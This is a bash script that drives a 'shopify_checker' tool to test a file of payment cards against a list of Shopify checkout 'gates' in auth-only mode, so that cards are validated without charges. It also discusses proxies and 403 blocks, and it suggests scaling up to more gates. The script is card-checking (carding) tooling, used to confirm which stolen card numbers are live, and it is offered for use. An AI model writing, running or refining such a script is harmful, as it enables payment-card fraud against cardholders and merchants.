#!/bin/bash
# Test Gates WITHOUT Proxies - Simplest Solution
# Avoids 403 errors by not using proxies

set -e

echo "════════════════════════════════════════════════════════════"
echo "  Simple Gate Testing - NO PROXIES"
echo "  Avoids 403 errors by testing directly"
echo "════════════════════════════════════════════════════════════"
echo ""

# Check if ChromeDriver is running
if ! pgrep -f chromedriver > /dev/null; then
    echo "⚠️  ChromeDriver not running. Starting it..."
    chromedriver --port=9515 > /dev/null 2>&1 &
    sleep 2
    echo "✓ ChromeDriver started"
else
    echo "✓ ChromeDriver already running"
fi

echo ""

# Create test file with first 10 gates
echo "Creating test file with 10 gates..."
head -10 full_test_gates.txt > test_10_gates.txt
echo "✓ Created test_10_gates.txt"

echo ""
echo "Configuration:"
echo "  Gates: 10 (from full_test_gates.txt)"
echo "  Cards: All from full_test_cards.txt"
echo "  Mode: Auth-only (FREE - no charges)"
echo "  Proxies: NONE (avoids 403 errors)"
echo ""

echo "This will:"
echo "  ✓ Test 10 gates without proxies"
echo "  ✓ Use auth-only mode (wrong CVV = no charges)"
echo "  ✓ Find which gates work"
echo "  ✓ Take ~5-10 minutes"
echo ""

read -p "Press Enter to start testing..."

echo ""
echo "Starting test..."
echo ""

# Run the checker WITHOUT proxy flag
echo "y" | timeout 600 ./target/release/shopify_checker rotate \
  --gates test_10_gates.txt \
  --cards-file full_test_cards.txt \
  --auth-only=true \
  --max-gates 10 2>&1 | tee test_no_proxy_results.log

echo ""
echo "════════════════════════════════════════════════════════════"
echo "  Test Complete!"
echo "════════════════════════════════════════════════════════════"
echo ""

# Check results
if [ -f "rotate_results.json" ]; then
    echo "✓ Results saved to: rotate_results.json"
    echo "✓ Log saved to: test_no_proxy_results.log"
    echo ""
    
    # Count valid gates
    valid_count=$(grep -c '"success":true' rotate_results.json 2>/dev/null || echo "0")
    echo "Found $valid_count valid gate(s)"
    echo ""
    
    if [ "$valid_count" -gt 0 ]; then
        echo "✅ SUCCESS! Found working gates without proxies"
        echo ""
        echo "Next steps:"
        echo "1. Review rotate_results.json for valid gates"
        echo "2. Test more gates: head -50 full_test_gates.txt > test_50_gates.txt"
        echo "3. Run again with test_50_gates.txt"
    else
        echo "⚠️  No valid gates found in this batch"
        echo ""
        echo "Try:"
        echo "1. Test different gates: tail -10 full_test_gates.txt > test_10_gates.txt"
        echo "2. Run this script again"
    fi
else
    echo "⚠️  No results file found"
    echo "Check test_no_proxy_results.log for errors"
fi

echo ""
echo "════════════════════════════════════════════════════════════"
